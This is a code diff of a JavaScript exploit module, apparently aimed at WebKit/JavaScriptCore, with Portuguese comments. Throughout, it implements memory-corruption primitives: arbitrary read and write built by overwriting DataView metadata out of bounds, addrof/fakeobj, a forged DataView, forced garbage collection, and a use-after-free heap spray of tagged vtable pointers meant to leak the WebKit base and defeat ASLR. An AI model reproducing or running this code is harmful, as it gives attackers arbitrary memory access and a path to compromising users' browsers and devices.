-            throw new TypeError(`Endereço convertido para arb_read não é AdvancedInt64 válido.`);
-        }
-    }
-
-    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
-    let result_val = null;
-    try {
-        log(`[${FNAME}] DEBUG: Realizando snapshots de metadados do DataView antes da manipulação.`, 'debug');
-        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
-        m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
-        m_mode_orig_snap = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
-        log(`[${FNAME}] DEBUG: Snapshots ORIGINAIS: m_vector=${toHexHelper(m_vector_orig_snap)}, m_length=${toHex(m_length_orig_snap)}, m_mode=${toHex(m_mode_orig_snap)}`, 'debug');
-
-
-        if (!isAdvancedInt64Object(m_vector_orig_snap)) { // Usando a função importada diretamente
-            log(`[${FNAME}] ALERTA CRÍTICO: m_vector_orig_snap NÃO é AdvancedInt64 após leitura (verif. local). Tipo: ${typeof m_vector_orig_snap}. Construtor: ${m_vector_orig_snap?.constructor?.name}. Valor: ${toHexHelper(m_vector_orig_snap)}. A restauração falhará.`, 'critical');
-            isOOBEnvironmentSetup = false;
-            throw new Error("Falha ao ler m_vector original como AdvancedInt64 em arb_read (verif. local).");
-        }
-
-        log(`[${FNAME}] DEBUG: Escrevendo NOVO m_vector (${toHexHelper(addr64)}) e m_length (0xFFFFFFFF) para permitir leitura arbitrária.`, 'debug');
-        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
-        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
-        log(`[${FNAME}] DEBUG: Valores do DataView APÓS MANIPULAÇÃO: m_vector=${toHexHelper(oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8))}, m_length=${toHex(oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4))}.`, 'debug');
-
-
-        log(`[${FNAME}] DEBUG: Realizando leitura arbitrária de ${addr64.toString(true)} (byteLength: ${byteLength}).`, 'debug');
-        switch (byteLength) {
-            case 1: result_val = oob_dataview_real.getUint8(0); break;
-            case 2: result_val = oob_dataview_real.getUint16(0, true); break;
-            case 4: result_val = oob_dataview_real.getUint32(0, true); break;
-            case 8: {
-                const low = oob_dataview_real.getUint32(0, true);
-                const high = oob_dataview_real.getUint32(4, true);
-                result_val = new AdvancedInt64(low, high);
-                break;
-            }
-            default: throw new Error(`Invalid byteLength for arb_read: ${byteLength}`);
-        }
-        log(`[${FNAME}] DEBUG: Leitura arbitrária concluída. Resultado: ${toHexHelper(result_val, byteLength * 8)}.`, 'debug');
-        return result_val;
-    } catch (e) {
-        log(`ERRO CRÍTICO em ${FNAME} ao ler de ${addr64.toString(true)} (byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
-        // Se a leitura arbitrária falhar, é um sinal de instabilidade.
-        isOOBEnvironmentSetup = false;
-        throw e;
-    } finally {
-        if (isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) { // Usando a função importada diretamente
-            log(`[${FNAME}] DEBUG: Restaurando metadados originais do DataView.`, 'debug');
-            try {
-                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
-                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
-                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
-                await _perform_explicit_dv_reset_after_arb_op(FNAME);
-                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, 'debug');
-            } catch (e_restore) {
-                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${e_restore.message}. Ambiente agora INSEGURo.`, 'critical');
-                isOOBEnvironmentSetup = false; // Se a restauração falhar, o ambiente está comprometido.
-            }
-        } else if (isOOBReady()) { // Se isOOBReady ainda for true, mas snapshots inválidos
-            log(`[${FNAME}] ALERTA: Não pôde restaurar metadados porque m_vector_orig_snap não era AdvancedInt64 ou outras variáveis de snapshot estavam inválidas. Ambiente instável.`, 'critical');
-            isOOBEnvironmentSetup = false;
-        } else {
-            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, 'critical');
-        }
-    }
-}
-
-export async function arb_write(absolute_address, value, byteLength) {
-    const FNAME = 'CoreExploit.arb_write (v31.13)';
-    if (!isOOBReady()) {
-        log(`[${FNAME}] Ambiente OOB não está pronto para escrita arbitrária. Tentando re-inicializar...`, 'warn');
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) {
-            throw new Error("Ambiente OOB não pôde ser inicializado para escrita arbitrária.");
-        }
-    }
-    let addr64 = absolute_address;
-    if (!isAdvancedInt64Object(addr64)) { // Usando a função importada diretamente
-        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
-            throw new TypeError(`Endereço para arb_write deve ser AdvancedInt64 ou conversível: ${e.message}`);
-        }
-        if (!isAdvancedInt64Object(addr64)) { // Usando a função importada diretamente
-            throw new TypeError(`Endereço convertido para arb_write não é AdvancedInt64 válido.`);
-        }
-    }
-
-    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
-    try {
-        log(`[${FNAME}] DEBUG: Realizando snapshots de metadados do DataView antes da manipulação para escrita.`, 'debug');
-        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
-        m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
-        m_mode_orig_snap = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
-        log(`[${FNAME}] DEBUG: Snapshots ORIGINAIS: m_vector=${toHexHelper(m_vector_orig_snap)}, m_length=${toHex(m_length_orig_snap)}, m_mode=${toHex(m_mode_orig_snap)}`, 'debug');
-
-
-        if (!isAdvancedInt64Object(m_vector_orig_snap)) { // Usando a função importada diretamente
-            log(`[${FNAME}] ALERTA CRÍTICO: m_vector_orig_snap NÃO é AdvancedInt64 após leitura (verif. local). Tipo: ${typeof m_vector_orig_snap}. Construtor: ${m_vector_orig_snap?.constructor?.name}. Valor: ${toHexHelper(m_vector_orig_snap)}. A restauração falhará.`, 'critical');
-            isOOBEnvironmentSetup = false;
-            throw new Error("Falha ao ler m_vector original como AdvancedInt64 em arb_write (verif. local).");
-        }
-
-        log(`[${FNAME}] DEBUG: Escrevendo NOVO m_vector (${toHexHelper(addr64)}) e m_length (0xFFFFFFFF) para permitir escrita arbitrária.`, 'debug');
-        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
-        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
-        log(`[${FNAME}] DEBUG: Valores do DataView APÓS MANIPULAÇÃO: m_vector=${toHexHelper(oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8))}, m_length=${toHex(oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4))}.`, 'debug');
-
-
-        log(`[${FNAME}] DEBUG: Realizando escrita arbitrária em ${addr64.toString(true)} (valor: ${toHexHelper(value, byteLength * 8)}, byteLength: ${byteLength}).`, 'debug');
-        let val64_write;
-        switch (byteLength) {
-            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
-            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
-            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
-            case 8:
-                val64_write = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value); // Usando a função importada diretamente
-                if (!isAdvancedInt64Object(val64_write)) { // Usando a função importada diretamente
-                    throw new TypeError("Valor para escrita de 8 bytes não é AdvancedInt64 válido após conversão.");
-                }
-                oob_dataview_real.setUint32(0, val64_write.low(), true);
-                oob_dataview_real.setUint32(4, val64_write.high(), true);
-                break;
-            default: throw new Error("Invalid byteLength para arb_write");
-        }
-        log(`[${FNAME}] DEBUG: Escrita arbitrária concluída.`, 'debug');
-    } catch (e) {
-        log(`ERRO CRÍTICO em ${FNAME} ao escrever em ${addr64.toString(true)} (valor: ${toHexHelper(value, byteLength * 8)}, byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
-        // Se a escrita arbitrária falhar, é um sinal de instabilidade.
-        isOOBEnvironmentSetup = false;
-        throw e;
-    } finally {
-        if (isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) { // Usando a função importada diretamente
-            log(`[${FNAME}] DEBUG: Restaurando metadados originais do DataView após escrita.`, 'debug');
-            try {
-                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
-                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
-                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
-                await _perform_explicit_dv_reset_after_arb_op(FNAME);
-                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, 'debug');
-            } catch (eR) {
-                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${eR.message}. Ambiente agora INSEGURo.`, 'critical');
-                isOOBEnvironmentSetup = false;
-            }
-        } else if (isOOBReady()) { // Se isOOBReady ainda for true, mas snapshots inválidos
-            log(`[${FNAME}] ALERTA: Não pôde restaurar metadados porque m_vector_orig_snap não era AdvancedInt64 ou outras variáveis de snapshot estavam inválidas. Ambiente instável.`, 'critical');
-            isOOBEnvironmentSetup = false;
-        } else {
-            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, 'critical');
-        }
-    }
-}
-
-
-export function selfTestOOBReadWrite(logFnParam) {
-    const currentLog = logFnParam || log;
-    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
-    currentLog(`--- Iniciando Auto-Teste de OOB R/W (v31.13 - com re-inicialização forçada e validação) ---`, 'test', FNAME_TEST);
-    let success32 = false;
-    let success64 = false;
-    try {
-        currentLog(`    (Setup) Chamando triggerOOB_primitive...`, 'info', FNAME_TEST);
-        triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) {
-            currentLog(`    (Setup) FALHA CRÍTICA: Ambiente OOB não pôde ser inicializado para auto-teste.`, 'critical', FNAME_TEST);
+        _fake_data_view = fakeobj_core(backing_ab_addr);
+        if (!(_fake_data_view instanceof DataView)) {
+            logFn(`[${FNAME}] FALHA: fakeobj_core não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Construtor: ${_fake_data_view?.constructor?.name}`, "error", FNAME);
             return false;
         }
-        currentLog(`    (Setup) Ambiente OOB pronto para teste.`, 'good', FNAME_TEST);
+        logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);
 
-        const test_offset = 0x50; // Offset dentro do oob_array_buffer_real
-        // Garantir que o offset de teste esteja dentro dos limites do buffer real.
-        if (test_offset + 8 > oob_array_buffer_real.byteLength) {
-             currentLog(`    (Setup) ERRO: Offset de teste (${toHex(test_offset)}) está fora dos limites do oob_array_buffer_real (${oob_array_buffer_real.byteLength}).`, 'critical', FNAME_TEST);
-             throw new Error("Offset de teste fora dos limites.");
-        }
+        // Testar a primitiva de leitura/escrita arbitrária universal recém-criada
+        const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
+        hold_objects.push(test_target_js_object);
+        const test_target_js_object_addr = addrof_core(test_target_js_object);
 
+        // Antes de testar o _fake_data_view, precisamos apontar o m_vector dele para o endereço do nosso objeto de teste.
+        // O m_vector do _fake_data_view é na verdade o JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET dentro do `backing_array_buffer`.
+        const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
+        await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, test_target_js_object_addr, 8, logFn);
 
-        // Teste de 32 bits
-        const test_val32 = 0x11223344;
-        currentLog(`    (32bit Test) Escrevendo ${toHex(test_val32)} em offset absoluto ${toHex(test_offset)} do oob_array_buffer_real`, 'debug', FNAME_TEST);
-        oob_write_absolute(test_offset, test_val32, 4);
-        const read_val32 = oob_read_absolute(test_offset, 4);
-        currentLog(`    (32bit Test) Lido ${toHex(read_val32)} de offset absoluto ${toHex(test_offset)}`, "debug", FNAME_TEST);
+        const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
+        _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true);
+        const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);
 
-        if (read_val32 === test_val32) {
-            currentLog(`    (32bit Test) SUCESSO: Lido ${toHex(read_val32)} corretamente.`, "good", FNAME_TEST);
-            success32 = true;
+        if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
+            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
+            // Restaurar o ponteiro de dados do _fake_data_view para evitar corrupções futuras se ele for coletado
+            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
+            return true;
         } else {
-            currentLog(`    (32bit Test) FALHA: Lido ${toHex(read_val32)}, esperado ${toHex(test_val32)}.`, "error", FNAME_TEST);
+            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
+            logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
+            // Restaurar o ponteiro de dados mesmo em caso de falha
+            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
+            return false;
         }
-
-        // Teste de 64 bits
-        const next_offset = test_offset + 16;
-        if (next_offset + 8 > oob_array_buffer_real.byteLength) {
-            currentLog(`    (64bit Test) ERRO: Offset ${toHex(next_offset)} fora dos limites do buffer (${oob_array_buffer_real.byteLength})`, "critical", FNAME_TEST);
-            throw new Error("Offset para teste 64bit fora dos limites");
-        }
-        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
-        currentLog(`    (64bit Test) Escrevendo (test_val64): ${toHexHelper(test_val64)} em offset absoluto ${toHex(next_offset)}`, 'debug', FNAME_TEST);
-        oob_write_absolute(next_offset, test_val64, 8);
-
-        const read_val64 = oob_read_absolute(next_offset, 8);
-        currentLog(`    (64bit Test) Lido de offset absoluto ${toHex(next_offset)}. Tipo retornado: ${typeof read_val64}.`, 'debug', FNAME_TEST);
-
-        if (isAdvancedInt64Object(read_val64)) { // Usando a função importada diretamente
-            currentLog(`    (64bit Test) Verificação local de tipo: OK. Valor lido (read_val64): ${toHexHelper(read_val64)}`, 'debug', FNAME_TEST);
-            if (read_val64.low() === test_val64.low() && read_val64.high() === test_val64.high()) {
-                currentLog(`    (64bit Test) SUCESSO: Lido ${toHexHelper(read_val64)} (low/high) corretamente.`, "good", FNAME_TEST);
-                success64 = true;
-            } else {
-                currentLog(`    (64bit Test) FALHA: Componentes low/high não correspondem. Lido ${toHexHelper(read_val64)}, Esperado ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
-                currentLog(`        Lido  : low=0x${read_val64.low().toString(16)}, high=0x${read_val64.high().toString(16)}`, "error", FNAME_TEST);
-                currentLog(`        Esperado: low=0x${test_val64.low().toString(16)}, high=0x${test_val64.high().toString(16)}`, "error", FNAME_TEST);
-            }
-        } else {
-            currentLog(`    (64bit Test) FALHA: Valor lido NÃO é reconhecido como um objeto AdvancedInt64 pela verificação local. Construtor: ${read_val64?.constructor?.name}. Valor: ${String(read_val64)} Esperado: ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
-        }
-
-        currentLog(`--- Auto-Teste de OOB R/W Concluído (32bit: ${success32}, 64bit: ${success64}) ---`, 'test', FNAME_TEST);
-        return success32 && success64;
     } catch (e) {
-        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
-        console.error(`[${FNAME_TEST}] Exception: `, e);
-        // Em caso de exceção no self-test, o ambiente provavelmente não está funcional.
-        isOOBEnvironmentSetup = false;
+        logFn(`[${FNAME}] ERRO durante teste de L/E Universal com m_mode ${toHex(m_mode_to_try)}: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
+        // Tentar restaurar o ponteiro de dados do _fake_data_view, se possível, antes de retornar falso
+        try {
+            if (backing_array_buffer) {
+                const backing_ab_addr = addrof_core(backing_array_buffer);
+                const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
+                await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
+            }
+        } catch (cleanupErr) {
+            logFn(`[${FNAME}] ERRO durante limpeza (restauração do m_vector) após falha de L/E Universal: ${cleanupErr.message}`, "error", FNAME);
+        }
         return false;
     } finally {
-        // Garantir que o ambiente seja limpo, mesmo que o teste falhe
-        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-        currentLog(`    (Cleanup) Ambiente OOB limpo após self-test.`, 'info', FNAME_TEST);
+        if (backing_array_buffer) {
+            const index = hold_objects.indexOf(backing_array_buffer);
+            if (index > -1) { hold_objects.splice(index, 1); }
+        }
+        _fake_data_view = null; // Resetar para garantir que o próximo teste comece limpo
     }
 }
 
-const HEISENBUG_OOB_DATAVIEW_METADATA_BASE_core = OOB_DV_METADATA_BASE_IN_OOB_BUFFER;
-const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET_core = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
-const HEISENBUG_CRITICAL_WRITE_OFFSET_core = HEISENBUG_OOB_DATAVIEW_METADATA_BASE_core + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET_core;
-const HEISENBUG_CRITICAL_WRITE_VALUE_core = 0xFFFFFFFF;
-const HEISENBUG_VICTIM_AB_SIZE_core = 64;
 
-export async function selfTestTypeConfusionAndMemoryControl(logFnParam) {
-    const currentLog = logFnParam || log;
-    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
-    currentLog(`--- Iniciando Auto-Teste Combinado (v31.13): Type Confusion e Controle de Memória ---`, 'test', FNAME_TEST);
+// --- Funções Auxiliares para a Cadeia de Exploração UAF (Integradas) ---
 
-    let originalToJSONDescriptor = null;
-    let pollutionApplied = false;
-    let local_probe_details_for_selftest = null;
-    let overallSuccess = false;
-    let tcPhaseSuccess = false;
+// Função para forçar Coleta de Lixo
+async function triggerGC(logFn, pauseFn) {
+    logFn("    Acionando GC...", "info", "GC_Trigger");
+    // Alocações grandes para forçar o GC. Mais agressivo.
+    try {
+        for (let i = 0; i < 1000; i++) { // Aumentado para 1000 iterações
+            new ArrayBuffer(1024 * 256); // Aloca 256KB, total de 256MB
+        }
+    } catch (e) {
+        logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
+    }
+    await pauseFn(LOCAL_SHORT_PAUSE); // Dá tempo para o GC executar
+    // Alocações pequenas para ajudar o GC a perceber a pressão
+    for (let i = 0; i < 50; i++) {
+        new ArrayBuffer(1024); // Aloca 1KB, 50 vezes
+    }
+    await pauseFn(LOCAL_SHORT_PAUSE); // Dar mais tempo para o GC.
+}
+
+// Cria um objeto, o coloca em uma estrutura que causa otimizações,
+// e retorna uma referência a ele após a estrutura ser destruída.
+// A lógica aqui é a do seu OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF.mjs
+async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) {
+    let dangling_ref = null; // Esta será a referência pendurada
+    const VICTIM_SIZE_BYTES = 0x80; // Tamanho do objeto vítima para UAF (128 bytes)
+
+    // PASSO 1: Criar o objeto vítima que será liberado mas que teremos uma dangling_ref.
+    // O tipo de objeto aqui (Float64Array) é crucial para como o ponteiro será lido.
+    // Queremos que o Type Confusion ocorra quando o JS tentar ler dangling_ref[0]
+    // e encontre o valor que pulverizamos.
+    let victim_object_arr = new Float64Array(VICTIM_SIZE_BYTES / 8); // Float64Array para UAF (128 bytes = 16 doubles)
+    // Preencha com um valor inicial conhecido para debug. 
+    // É importante que o valor não seja 0, pois 0 pode ser confundido com um ponteiro nulo.
+    victim_object_arr[0] = 1.000000000000123; // Um double com valor hex: 0x3FF0000000000206
+    victim_object_arr[1] = 2.0;
+
+    // Para evitar que o GC colete 'victim_object_arr' antes que o dangling_ref seja criado.
+    hold_objects.push(victim_object_arr); 
+    
+    // A referência pendurada é a própria 'victim_object_arr'
+    // A confusão de tipos ocorre porque o motor JS ainda pensa que 'dangling_ref' é um Float64Array,
+    // mas a memória subjacente será reocupada por um ArrayBuffer.
+    dangling_ref = victim_object_arr;
+
+    // Forçar otimizações (acessando a vítima repetidamente)
+    for (let i = 0; i < 1000; i++) { // Aumentado para mais otimizações
+        victim_object_arr[0] += 0.000000000000001; // Pequena alteração para forçar JIT
+    }
+    
+    logFn(`[UAF] Objeto vítima (Float64Array) criado e referência pendurada simulada.`, "info");
+    logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref).toString(true)}`, "info");
+    logFn(`[UAF] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref[0]), 64)})`, "info");
+
+    // PASSO 2: Forçar Coleta de Lixo para liberar a memória do 'victim_object_arr'
+    logFn("--- FASE 3: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
+    // Remova a referência 'victim_object_arr' do array de retenção para torná-lo elegível para GC.
+    // 'dangling_ref' ainda mantém uma referência, mas ela se tornará "pendurada" após o GC.
+    const ref_index = hold_objects.indexOf(victim_object_arr);
+    if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
+    victim_object_arr = null; // Remova a última referência forte.
+    await triggerGC(logFn, pauseFn); 
+    logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info");
+
+    // PASSO 3: Pulverizar sobre a memória liberada com Float64Array contendo o ponteiro desejado.
+    logFn("--- FASE 4: Pulverizando Float64Array com ponteiros sobre a memória liberada (MAIS AGRESSIVO) ---", "subtest");
+    const spray_arrays = [];
+    const SPRAY_COUNT_UAF_NEW = 5000; // Aumentado para 5000 para maior agressividade
+    const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES; // O tamanho da nova alocação deve corresponder ao da vítima
+
+    // --- Determinar o ponteiro a ser pulverizado ---
+    // Usaremos o endereço do vtable da Structure de DataView (0x3AD62A0)
+    // Para fins de pulverização, precisamos de uma BASE ASLR TEMPORÁRIA para criar o ponteiro DOUBLE.
+    // ESTA PARTE É CRÍTICA: SE o 0x3AD62A0 NÃO É ONDE O VTABLE REALMENTE COMEÇA NA LIB, ISSO FALHARÁ.
+    // ESTE É UM ENDEREÇO RELATIVO À BASE DA LIB, NÃO UM ENDEREÇO ABSOLUTO DE VARIÁVEL GLOBAL.
+    // Você confirmou o 0x3AD62A0 é o offset do vtable.
+    // Assumiremos uma base hardcoded para CONSTRUIR O VALOR A SER PULVERIZADO.
+    // A base REAL será vazada pelo UAF.
+    // O valor 0x402a0000 é a "tag" de ponteiro de objeto para doubles.
+    // A base WebKit real começa geralmente em 0x....000 (alinhada em 0x1000), 
+    // mas a parte `high` do double JSValue usa 0x402a para indicar que é um ponteiro.
+    // Então, ao invés de usar uma base 0x00d44000, vamos focar em construir um double que
+    // represente um ponteiro válido JIT-compilável, se possível, para o endereço do vtable.
+    
+    // Para o spray inicial, queremos que o valor lido seja um ponteiro para a Structure da DataView.
+    // Um ponteiro de objeto em JSValue geralmente tem a tag 0x402a no high (para 64 bits).
+    // O offset do vtable da DataView é 0x3AD62A0.
+    // Então o valor que queremos pulverizar para ser lido é (possivelmente) um endereço como BASE_WEBKIT + OFFSET_VTABLE.
+    // Se a `addrof_core` já untagga, então o valor do spray **não deveria ter a tag**.
+    // Mas se o Type Confusion resultou em um `Float64Array` sendo lido onde o `victim_object_arr` estava,
+    // e esperamos que `dangling_ref[0]` nos dê um ponteiro `JSValue` (que tem a tag),
+    // então o valor do spray PRECISA ter a tag.
+
+    // Vamos assumir que a base da WebKit pode ser algo como 0x010000000000.
+    // Isso é uma ESTIMATIVA. O valor real será vazado depois.
+    const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Exemplo de base WebKit (apenas para simular um ponteiro)
+    const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 0); // O offset já é um número em hexadecimal na config
+
+    let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
+    
+    // AQUI ESTÁ O TRUQUE: O valor que o JS lê como double na posição 0 é um JSValue.
+    // JSValues que são ponteiros de objetos são "tagged". A tag comum para ponteiros de objeto (em doubles) é 0x402a no high.
+    // Então, o valor que precisamos pulverizar é o endereço do vtable COM ESSA TAG.
+    // Vamos adicionar essa tag ao High do AdvancedInt64 ANTES de converter para double.
+    const OBJECT_PTR_TAG_HIGH = 0x402a0000;
+    const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH;
+    TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
+
+
+    const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);
+    logFn(`[UAF] Valor Double do VTable da Structure para pulverização (assumindo tag e base): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");
+
+
+    for (let i = 0; i < SPRAY_COUNT_UAF_NEW; i++) {
+        const buf = new ArrayBuffer(SPRAY_BUF_SIZE_BYTES); 
+        const view = new Float64Array(buf);
+        view[0] = spray_value_double_to_leak_ptr; // Escreve o ponteiro da Structure no início do buffer
+        // Preenche o resto com marcadores
+        for (let j = 1; j < view.length; j++) {
+            view[j] = _int64ToDouble_direct(new AdvancedInt64(0xCDCDCDCD, 0xCDCDCDCD + j)); // Variar para facilitar a identificação se necessário
+        }
+        spray_arrays.push(buf);
+    }
+    hold_objects.push(spray_arrays); // Mantém os buffers em spray vivos.
+    logFn("    Pulverização de Float64Array concluída sobre a memória da vítima.", "info");
+    
+    return dangling_ref; // Retorna a referência pendurada que agora está "confusa"
+}
+
+
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
+    const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
+    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v152_AGRESSIVO"; // Nome mais curto para logs internos
+    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
+
+    let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
+    const startTime = performance.now();
+    let webkit_base_address = null;
+    let found_m_mode = null;
 
     try {
-        currentLog(`FASE 1: Testando Type Confusion (usando constantes HEISENBUG_*)...`, "subtest", FNAME_TEST);
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) {
-            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
+        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
+        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
+
+        logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
+        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
+        if (!arbTestSuccess) {
+            const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
         }
-        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_core, HEISENBUG_CRITICAL_WRITE_VALUE_core, 4);
-        currentLog(`        (TC SelfTest) Escrita OOB crítica realizada.`, "info", FNAME_TEST);
-        await PAUSE(100);
+        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
 
-        let victim_ab_for_selftest = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_core);
-        currentLog(`    (TC SelfTest) victim_ab_for_selftest (tamanho ${HEISENBUG_VICTIM_AB_SIZE_core} bytes) criado.`, "info", FNAME_TEST);
 
-        const toJSON_ProbeForSelfTest = function () {
-            local_probe_details_for_selftest = {
-                this_type_in_toJSON: Object.prototype.toString.call(this),
-                is_victim_direct_ref: (this === victim_ab_for_selftest)
-            };
-            return { self_test_probe_executed_tc: true, observed_this_type: local_probe_details_for_selftest.this_type_in_toJSON };
